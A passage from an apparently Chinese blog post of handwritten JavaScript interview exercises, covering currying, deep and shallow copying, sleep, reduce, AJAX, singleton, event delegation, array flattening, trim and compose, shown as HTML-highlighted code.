(parent.children || (parent.children = [])).push(item);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      result.push(item);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;);</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="实现函数柯里化（1）"><a href="#实现函数柯里化（1）" class="headerlink" title="实现函数柯里化（1）"></a>实现函数柯里化（1）</h2><p>柯里化就是把接受<strong>「多个参数」</strong>的函数变换成接受一个<strong>「单一参数」</strong>的函数，并且返回接受<strong>「余下参数」</strong>返回结果的一种应用。具体实现参考自<a href="https://zh.javascript.info/currying-partials">该文章</a>：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">curry</span>(<span class="params">func</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="function"><span class="keyword">function</span> <span class="title">curried</span>(<span class="params">...args</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// 判断参数的长度是否满足函数所需参数的长度</span></span><br><span class="line">    <span class="keyword">if</span> (args.length &gt;= func.length) &#123;</span><br><span class="line">      <span class="comment">// 满足则执行函数</span></span><br><span class="line">      <span class="keyword">return</span> func.apply(<span class="built_in">this</span>, args);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="comment">// 否则递归返回柯里化的函数，等待下一个参数</span></span><br><span class="line">      <span class="keyword">return</span> <span class="function"><span class="keyword">function</span> (<span class="params">...args2</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> curried.apply(<span class="built_in">this</span>, args.concat(args2));</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// es6</span></span><br><span class="line"><span class="keyword">let</span> currying = <span class="function">(<span class="params">fn, ...args</span>) =&gt;</span></span><br><span class="line">            fn.length &gt; args.length ?</span><br><span class="line">            <span class="function">(<span class="params">...<span class="built_in">arguments</span></span>) =&gt;</span> currying(fn, ...args, ...arguments) :</span><br><span class="line">            fn(...args)</span><br></pre></td></tr></table></figure><h2 id="实现拷贝"><a href="#实现拷贝" class="headerlink" title="实现拷贝"></a>实现拷贝</h2><h3 id="浅拷贝"><a href="#浅拷贝" class="headerlink" title="浅拷贝"></a>浅拷贝</h3><p>1、Object.assign()实现</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> initalObj = <span class="built_in">Object</span>.assign(&#123;&#125;, obj);</span><br></pre></td></tr></table></figure><p>2、函数库lodash的_.clone方法</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> obj2 = _.clone(obj1);</span><br></pre></td></tr></table></figure><p>3、展开运算符…</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> obj2= &#123;...obj1&#125;</span><br></pre></td></tr></table></figure><p>4、Array.prototype.concat()</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> arr2 = arr.concat();    </span><br></pre></td></tr></table></figure><p>5、Array.prototype.slice()</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> arr3 = arr.slice();</span><br></pre></td></tr></table></figure><p>6、手写：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">shallowCopy</span>(<span class="params">object</span>) </span>&#123;</span><br><span class="line">  <span class="comment">// 只拷贝对象</span></span><br><span class="line">  <span class="keyword">if</span> (!object || <span class="keyword">typeof</span> object !== <span class="string">&quot;object&quot;</span>) <span class="keyword">return</span>;</span><br><span class="line">  <span class="comment">// 根据 object 的类型判断是新建一个数组还是对象</span></span><br><span class="line">  <span class="keyword">let</span> newObject = <span class="built_in">Array</span>.isArray(object) ? [] : &#123;&#125;;</span><br><span class="line">  <span class="comment">// 遍历 object，并且判断是 object 的属性才拷贝</span></span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> key <span class="keyword">in</span> object) &#123;</span><br><span class="line">    <span class="keyword">if</span> (object.hasOwnProperty(key)) &#123;</span><br><span class="line">      newObject[key] = object[key];</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> newObject;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="深拷贝（1）"><a href="#深拷贝（1）" class="headerlink" title="深拷贝（1）"></a>深拷贝（1）</h3><p>要求考虑到对象、数组、Date、正则和函数</p><p>1、参考自<a href="https://segmentfault.com/a/1190000020255831">如何写出一个惊艳面试官的深拷贝?</a>，讲的真的很详细！但是剩下的很多好没有实现。</p><ul><li>基本实现<ul><li><input checked="" disabled="" type="checkbox"> 递归能力</li></ul></li><li>循环引用<ul><li><input checked="" disabled="" type="checkbox"> 考虑问题的全面性</li><li><input checked="" disabled="" type="checkbox"> 理解weakmap的真正意义</li></ul></li><li>多种类型<ul><li><input disabled="" type="checkbox"> 考虑问题的严谨性</li><li><input disabled="" type="checkbox"> 创建各种引用类型的方法，JS API的熟练程度</li><li><input disabled="" type="checkbox"> 准确的判断数据类型，对数据类型的理解程度</li></ul></li><li>通用遍历：<ul><li><input disabled="" type="checkbox"> 写代码可以考虑性能优化</li><li><input disabled="" type="checkbox"> 了解集中遍历的效率</li><li><input disabled="" type="checkbox"> 代码抽象能力</li></ul></li><li>拷贝函数：<ul><li><input disabled="" type="checkbox"> 箭头函数和普通函数的区别</li><li><input disabled="" type="checkbox"> 正则表达式熟练程度</li></ul></li></ul><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">clone</span>(<span class="params">target, map = <span class="keyword">new</span> <span class="built_in">WeakMap</span>()</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (target <span class="keyword">instanceof</span> <span class="built_in">RegExp</span>) <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">RegExp</span>(target);</span><br><span class="line">  <span class="keyword">if</span> (target <span class="keyword">instanceof</span> <span class="built_in">Date</span>) <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Date</span>(target);</span><br><span class="line">  <span class="keyword">if</span> (target === <span class="literal">null</span> || <span class="keyword">typeof</span> target !== <span class="string">&#x27;object&#x27;</span>) <span class="keyword">return</span> target;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">let</span> cloneTarget = <span class="built_in">Array</span>.isArray(target) ? [] : &#123;&#125;</span><br><span class="line">  <span class="comment">// 利用map解决循环引用问题 weakMap减少内存消耗</span></span><br><span class="line">  <span class="keyword">if</span> (map.has(target)) &#123;</span><br><span class="line">    <span class="keyword">return</span> map.get(target)</span><br><span class="line">  &#125;</span><br><span class="line">  map.set(target, cloneTarget)</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">const</span> key <span class="keyword">in</span> target) &#123;</span><br><span class="line">    cloneTarget[key] = clone(target[key],map)</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> cloneTarget</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>2、对象只有一层的话可以使用Object.assign()函数</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> initalObj = <span class="built_in">Object</span>.assign(&#123;&#125;, obj);</span><br></pre></td></tr></table></figure><p>3、用JSON.stringify把对象转成字符串，再用JSON.parse把字符串转成新的对象。局限性：</p><ul><li>会忽略 <code>undefined</code></li><li>会忽略 <code>symbol</code></li><li>不能序列化函数</li><li>不能解决循环引用的对象</li></ul><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> cloneObj = <span class="function"><span class="keyword">function</span>(<span class="params">obj</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> str, newobj = obj.constructor === <span class="built_in">Array</span> ? [] : &#123;&#125;;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">typeof</span> obj !== <span class="string">&#x27;object&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span>(<span class="built_in">window</span>.JSON)&#123;</span><br><span class="line">        str = <span class="built_in">JSON</span>.stringify(obj), <span class="comment">//系列化对象</span></span><br><span class="line">        newobj = <span class="built_in">JSON</span>.parse(str); <span class="comment">//还原</span></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">var</span> i <span class="keyword">in</span> obj)&#123;</span><br><span class="line">            newobj[i] = <span class="keyword">typeof</span> obj[i] === <span class="string">&#x27;object&#x27;</span> ? </span><br><span class="line">            cloneObj(obj[i]) : obj[i]; </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> newobj;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>4、函数库lodash的_.cloneDeep方法。</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> obj2 = _.cloneDeep(obj1);</span><br></pre></td></tr></table></figure><h2 id="实现sleep（高频）"><a href="#实现sleep（高频）" class="headerlink" title="实现sleep（高频）"></a>实现sleep（高频）</h2><p>某个时间后就去执行某个函数，使用Promise封装。</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sleep</span>(<span class="params">fn, time</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">      resolve(fn)</span><br><span class="line">    &#125;,time)</span><br><span class="line">  &#125;)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">function</span> <span class="title">autoPlay</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">await</span> sleep(fn(),<span class="number">1000</span>)</span><br><span class="line">  <span class="keyword">await</span> sleep(fn(),<span class="number">1000</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="实现数组reduce（1）"><a href="#实现数组reduce（1）" class="headerlink" title="实现数组reduce（1）"></a>实现数组reduce（1）</h2><p>更多的实现数组方法见<a href="https://juejin.cn/post/6846687601806557192#comment">「数组方法」从详细操作js数组到浅析v8中array.js</a>。</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Array</span>.prototype.myReduce = <span class="function"><span class="keyword">function</span> (<span class="params">fn, initValue</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (initValue === <span class="literal">undefined</span> &amp;&amp; !<span class="built_in">this</span>.length) &#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&#x27;myReduce of empty array with no initial value&#x27;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// this 就是调用 myReduce 的数组</span></span><br><span class="line">  <span class="keyword">let</span> result = initValue ? initValue : <span class="built_in">this</span>[<span class="number">0</span>];</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> i = initValue ? <span class="number">0</span> : <span class="number">1</span>; i &lt; <span class="built_in">this</span>.length; i++) &#123;</span><br><span class="line">    <span class="comment">// acc cur index src</span></span><br><span class="line">    result = fn(result, <span class="built_in">this</span>[i], i, <span class="built_in">this</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="手写AJAX（1）"><a href="#手写AJAX（1）" class="headerlink" title="手写AJAX（1）"></a>手写AJAX（1）</h2><p>最简易版本</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">ajax</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="comment">// 1.创建XMLHttpRequest对象</span></span><br><span class="line">    <span class="keyword">let</span> request = <span class="keyword">new</span> XMLHttpRequest()</span><br><span class="line">    <span class="comment">// 2.创建http请求</span></span><br><span class="line">    request.open(<span class="string">&#x27;get&#x27;</span>, <span class="string">&#x27;https://www.baidu.com&#x27;</span>)</span><br><span class="line">    <span class="comment">// 3.设置相应http请求状态变化的函数</span></span><br><span class="line">    request.onreadystatechange = <span class="function">() =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (request.readyState === <span class="number">4</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (request.status &gt;= <span class="number">200</span> &amp;&amp; request.status &lt;<span class="number">300</span> || request.status == <span class="number">304</span>) &#123;</span><br><span class="line">                <span class="comment">// 5.获取异步调用返回的函数</span></span><br><span class="line">                <span class="keyword">let</span> string = request.responseText</span><br><span class="line">                <span class="keyword">let</span> object = <span class="built_in">JSON</span>.parse(string)</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 设置请求失败时的监听函数</span></span><br><span class="line">    request.onerror = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">      <span class="built_in">console</span>.error(<span class="built_in">this</span>.statusText);</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="comment">// 设置请求头信息</span></span><br><span class="line">    request.responseType = <span class="string">&quot;json&quot;</span>;</span><br><span class="line">    request.setRequestHeader(<span class="string">&quot;Accept&quot;</span>, <span class="string">&quot;application/json&quot;</span>);</span><br><span class="line">    <span class="comment">// 4.发送http请求</span></span><br><span class="line">    request.send()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="手写单例模式（1）"><a href="#手写单例模式（1）" class="headerlink" title="手写单例模式（1）"></a>手写单例模式（1）</h2><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SingleDog</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="title">show</span>(<span class="params"></span>)</span> &#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">&#x27;我是一个单例对象&#x27;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">static</span> <span class="function"><span class="title">getInstance</span>(<span class="params"></span>)</span> &#123;</span><br><span class="line">        <span class="comment">// 判断是否已经new过1个实例</span></span><br><span class="line">        <span class="keyword">if</span> (!SingleDog.instance) &#123;</span><br><span class="line">            <span class="comment">// 若这个唯一的实例不存在，那么先创建它</span></span><br><span class="line">            SingleDog.instance = <span class="keyword">new</span> SingleDog()</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 如果这个唯一的实例已经存在，则直接返回</span></span><br><span class="line">        <span class="keyword">return</span> SingleDog.instance</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> s1 = SingleDog.getInstance()</span><br><span class="line"><span class="keyword">const</span> s2 = SingleDog.getInstance()</span><br><span class="line">s1 === s2 <span class="comment">// true</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 也可以利用闭包来实现：</span></span><br><span class="line">SingleDog.getInstance = (<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="comment">// 定义自由变量instance，模拟私有变量</span></span><br><span class="line">    <span class="keyword">let</span> instance = <span class="literal">null</span></span><br><span class="line">    <span class="keyword">return</span> <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="comment">// 判断自由变量是否为null</span></span><br><span class="line">        <span class="keyword">if</span>(!instance) &#123;</span><br><span class="line">            <span class="comment">// 如果为null则new出唯一实例</span></span><br><span class="line">            instance = <span class="keyword">new</span> SingleDog()</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> instance</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)()</span><br></pre></td></tr></table></figure><h2 id="实现一个事件委托"><a href="#实现一个事件委托" class="headerlink" title="实现一个事件委托"></a>实现一个事件委托</h2><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">ul</span> <span class="attr">id</span>=<span class="string">&quot;ul&quot;</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">li</span> <span class="attr">id</span>=<span class="string">&quot;l1&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">span</span>&gt;</span>1<span class="tag">&lt;/<span class="name">span</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">li</span> <span class="attr">id</span>=<span class="string">&quot;l2&quot;</span>&gt;</span>2<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">li</span> <span class="attr">id</span>=<span class="string">&quot;l3&quot;</span>&gt;</span>3<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">li</span> <span class="attr">id</span>=<span class="string">&quot;l4&quot;</span>&gt;</span>4<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br></pre></td></tr></table></figure><p>给li绑定事件，注意以上这种情况。</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">delegate</span>(<span class="params">element, eventType, selector, fn</span>) </span>&#123;</span><br><span class="line">  element.addEventListener(eventType, <span class="function"><span class="params">e</span> =&gt;</span> &#123;</span><br><span class="line">      <span class="keyword">let</span> el = e.target</span><br><span class="line">      <span class="comment">// 如果元素被指定的选择器字符串选择，Element.matches()方法返回true</span></span><br><span class="line">      <span class="keyword">while</span> (!el.matches(selector)) &#123;</span><br><span class="line">          <span class="comment">// 遍历到最顶层，退出</span></span><br><span class="line">          <span class="keyword">if</span> (element === el) &#123;</span><br><span class="line">              el = <span class="literal">null</span></span><br><span class="line">              <span class="keyword">break</span></span><br><span class="line">          &#125;</span><br><span class="line">          el = el.parentNode</span><br><span class="line">      &#125;</span><br><span class="line">      el &amp;&amp; <span class="built_in">console</span>.log(<span class="string">&#x27;执行回调函数&#x27;</span>)</span><br><span class="line">  &#125;,<span class="literal">true</span>)</span><br><span class="line">  <span class="keyword">return</span> element</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="实现一个可以拖拽的DIV"><a href="#实现一个可以拖拽的DIV" class="headerlink" title="实现一个可以拖拽的DIV"></a>实现一个可以拖拽的DIV</h2><p>一个元素的拖拽过程，我们可以分为三个步骤，第一步是鼠标按下目标元素，第二步是鼠标保持按下的状态移动鼠标，第三步是鼠标抬起，拖拽过程结束。三个鼠标事件：点击、移动、抬起。</p><p>如果是图片，加入<code>e.preventDefault();</code></p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> dv=<span class="built_in">document</span>.getElementById(<span class="string">&#x27;dv&#x27;</span>);</span><br><span class="line"><span class="keyword">let</span> isDrag=<span class="literal">false</span></span><br><span class="line"><span class="keyword">let</span> position=<span class="literal">null</span></span><br><span class="line">dv.addEventListener(<span class="string">&#x27;mousedown&#x27;</span>,<span class="function"><span class="keyword">function</span>(<span class="params">e</span>)</span>&#123;</span><br><span class="line">    isDrag=<span class="literal">true</span></span><br><span class="line">    position=[e.clientX,e.clientY]</span><br><span class="line">&#125;)</span><br><span class="line">dv.addEventListener(<span class="string">&#x27;mousemove&#x27;</span>,<span class="function"><span class="keyword">function</span>(<span class="params">e</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(!isDrag) <span class="keyword">return</span> <span class="literal">null</span></span><br><span class="line">    <span class="keyword">const</span> x=e.clientX</span><br><span class="line">    <span class="keyword">const</span> y=e.clientY</span><br><span class="line">    <span class="keyword">const</span> changeX=x-position[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">const</span> changeY=y-position[<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">const</span> left=<span class="built_in">parseInt</span>(dv.style.left||<span class="number">0</span>)</span><br><span class="line">    <span class="keyword">const</span> top=<span class="built_in">parseInt</span>(dv.style.top||<span class="number">0</span>)</span><br><span class="line">    dv.style.left=left+changeX+<span class="string">&#x27;px&#x27;</span></span><br><span class="line">    dv.style.top=top+changeY+<span class="string">&#x27;px&#x27;</span></span><br><span class="line">    position=[x,y]</span><br><span class="line">&#125;)</span><br><span class="line">dv.addEventListener(<span class="string">&#x27;mouseup&#x27;</span>,<span class="function"><span class="keyword">function</span>(<span class="params">e</span>)</span>&#123;</span><br><span class="line">    isDrag=<span class="literal">false</span></span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><h2 id="实现数组扁平化（高频）"><a href="#实现数组扁平化（高频）" class="headerlink" title="实现数组扁平化（高频）"></a>实现数组扁平化（高频）</h2><p>使用 reduce、concat 和递归展开无限多层嵌套的数组，详情见<a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Array/flat#reduce_concat_isarray_recursivity">MDN reduce应用</a></p><p>1、ES6的Array.prototype.flat([depth]) 不知道维度时可以指明 depth 为 Infinity。<br><code>Array.prototype.flat(num)</code></p><p>2、正经写法：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">flatDeep</span>(<span class="params">arr, d = <span class="number">1</span></span>)</span>&#123;</span><br><span class="line">  <span class="keyword">return</span> d &gt; <span class="number">0</span> ? arr.reduce(<span class="function">(<span class="params">acc, val</span>) =&gt;</span> acc.concat(<span class="built_in">Array</span>.isArray(val) ? flatDeep(val, d - <span class="number">1</span>) : val), []) : arr.slice();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>3、调用数组的 toString() 方法</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">arr = [<span class="number">1</span>, [<span class="number">2</span>, <span class="number">3</span>, [<span class="number">4</span>, <span class="number">5</span>]]];</span><br><span class="line">arr = arr.toString().split(<span class="string">&#x27;,&#x27;</span>); <span class="comment">// 分割为数组</span></span><br><span class="line">arr = arr.map(<span class="function"><span class="params">item</span> =&gt;</span> <span class="built_in">parseFloat</span>(item)); <span class="comment">// 转数字 [ 1, 2, 3, 4, 5 ]</span></span><br></pre></td></tr></table></figure><p>4、while循环 + some</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">while</span> (arr.some(<span class="function">(<span class="params">item</span>) =&gt;</span> <span class="built_in">Array</span>.isArray(item))) &#123;</span><br><span class="line">    <span class="comment">// 只要有数组类型 都会通过展开运算符进行降维</span></span><br><span class="line">    arr = [].concat(...arr);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="用正则实现-trim"><a href="#用正则实现-trim" class="headerlink" title="用正则实现 trim()"></a>用正则实现 trim()</h2><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">String</span>.prototype.trim = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="comment">// ^开始, \s空格, +一或多个, |或, $结束</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">this</span>.replace(<span class="regexp">/^\s+|\s+$/g</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//或者 </span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">trim</span>(<span class="params">string</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> string.replace(<span class="regexp">/^\s+|\s+$/g</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="实现-compose-1"><a href="#实现-compose-1" class="headerlink" title="实现 compose(1)"></a>实现 compose(1)</h2><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">compose</span>(<span class="params">...fn</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (!fn.length) <span class="keyword">return</span> <span class="function">(<span class="params">v</span>) =&gt;</span> v;</span><br><span class="line">  <span class="keyword">if</span> (fn.length === <span class="number">1</span>) <span class="keyword">return</span> fn[<span class="number">0</span>];</span><br><span class="line">  <span class="keyword">return</span> fn.reduce(</span><br><span class="line">    <span class="comment">// pre 第一个函数 cur 下一个函数</span></span><br><span class="line">    <span class="function">(<span class="params">pre, cur</span>) =&gt;</span></span><br><span class="line">      <span class="comment">// args 传入的参数 1-&gt;5-&gt;8-&gt;10-&gt;11</span></span><br><span class="line">      <span class="function">(<span class="params">...args</span>) =&gt;</span></span><br><span class="line">        pre(cur(...args))</span><br><span class="line">  );</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 用法如下:</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fn1</span>(<span class="params">x</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> x + <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fn2</span>(<span class="params">x</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> x + <span class="number">2</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fn3</span>(<span class="params">x</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> x + <span class="number">3</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fn4</span>(<span class="params">x</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> x + <span class="number">4</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">const</span> a = compose(fn1, fn2, fn3, fn4);</span><br><span class="line"><span class="built_in">console</span>.log(a(<span class="number">1</span>)); <span class="comment">// 1+4+3+2+1=11</span></span><br></pre></td></tr></table></figure><h2 id="写一个通用的事件侦听器函数"><a href="#写一个通用的事件侦听器函数" class="headerlink" title="写一个通用的事件侦听器函数"></a>写一个通用的事件侦听器函数</h2><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> EventUtils = &#123;</span><br><span class="line">  <span class="comment">// 视能力分别使用dom0||dom2||IE方式 来绑定事件</span></span><br><span class="line">  <span class="comment">// 添加事件</span></span><br><span class="line">  <span class="attr">addEvent</span>: <span class="function"><span class="keyword">function</span>(<span class="params">element, type, handler</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (element.addEventListener) &#123;</span><br><span class="line">      element.addEventListener(type, handler, <span class="literal">false</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (element.attachEvent) &#123;</span><br><span class="line">      element.attachEvent(<span class="string">&quot;on&quot;</span> + type, handler);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      element[<span class="string">&quot;on&quot;</span> + type] = handler;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 移除事件</span></span><br><span class="line">  <span class="attr">removeEvent</span>: <span class="function"><span class="keyword">function</span>(<span class="params">element, type, handler</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (element.removeEventListener) &#123;</span><br><span class="line">      element.removeEventListener(type, handler, <span class="literal">false</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (element.detachEvent) &#123;</span><br><span class="line">      element.detachEvent(<span class="string">&quot;on&quot;</span> + type, handler);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      element[<span class="string">&quot;on&quot;</span> + type] = <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 获取事件目标</span></span><br><span class="line">  <span class="attr">getTarget</span>: <span class="function"><span class="keyword">function</span>(<span class="params">event</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> event.target || event.srcElement;</span><br><span class="line">  &#125;,</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 获取 event 对象的引用，取到事件的所有信息，确保随时能使用 event</span></span><br><span class="line">  <span class="attr">getEvent</span>: <span class="function"><span class="keyword">function</span>(<span class="params">event</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> event || <span class="built_in">window</span>.event;</span><br><span class="line">  &#125;,</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 阻止事件（主要是事件冒泡，因为 IE 不支持事件捕获）</span></span><br><span class="line">  <span class="attr">stopPropagation</span>: <span class="function"><span class="keyword">function</span>(<span class="params">event</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (event.stopPropagation) &#123;</span><br><span class="line">      event.stopPropagation();</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      event.cancelBubble = <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 取消事件的默认行为</span></span><br><span class="line">  <span class="attr">preventDefault</span>: <span class="function"><span class="keyword">function</span>(<span class="params">event</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (event.preventDefault) &#123;</span><br><span class="line">      event.preventDefault();</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      event.returnValue = <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="使用-setTimeout-实现-setInterval？（1）"><a href="#使用-setTimeout-实现-setInterval？（1）" class="headerlink" title="使用 setTimeout 实现 